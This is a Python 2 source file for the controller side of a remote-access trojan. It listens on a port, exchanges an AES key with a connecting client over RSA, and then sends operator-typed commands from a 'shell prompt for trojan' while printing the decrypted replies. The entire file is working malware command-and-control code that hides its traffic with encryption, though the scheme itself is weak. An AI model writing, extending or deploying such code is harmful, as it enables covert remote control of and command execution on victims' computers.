import socket
import os
from Crypto.Cipher import AES
import base64

import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
import ast
from Crypto.Util import asn1
from base64 import b64decode

import random, string



def randomword(length): #function to generate a random string of length "length"
   return ''.join(random.choice(string.lowercase) for i in range(length))

################ AES algorithm variables and padding ##########################
BLOCK_SIZE = 32 #define AES block size 
PADDING = '{'  #padding character to be used for enc/dec
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING #pad the text to be encrypted with sufficient number of '{' chars

#encrypt/encode and decrypt/decode the string
#AES for encryption/decryption and base64 for encode/decode
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s))) #first encrypt then encode
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING) #first decode then decrypt

#secret = 32*'a' #secret key
secret=randomword(32)#generate a random key of length 32
cipher=AES.new(secret)  #creating an AES cipher object
###############################################################################

c=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #creating a server socket object
c.bind(('0.0.0.0', 459)) #binding socket to port 443
c.listen(1) # listening for client

s,a = c.accept() #accepting a client in s(here s = client socket and a = client address)

######################### key exchange ###################
binPubKey=s.recv(1024)#recv client public key in binary
pubKeyObj =  RSA.importKey(binPubKey)#importing client key object from binary key recvd
print "public key recvd  : "+str(pubKeyObj)
secret_to_send = pubKeyObj.encrypt(secret,0)#encrypting secret with client public key
test=''.join(secret_to_send)#converting encrypted tuple to string 
s.send(test)#and sending
##########################################################

while True:
	data = s.recv(2048) #recv 2048 bytes(encrypted) form client
	print ("Encrypted data recvd : " + data) 
	decoded = DecodeAES(cipher, data)#decode the data recvd
	print ("Decrypted data : "+ decoded)
	
	if decoded=="bye":# break condition: if user enters bye the loop gets terminated!
		break
	
	nextcmd = raw_input("[shell]: ") #shell prompt for trojan
	encrypted=EncodeAES(cipher,nextcmd)#encrypt the command and send
	s.send(encrypted)
s.close()#close the client socket
c.close()#close the server socket
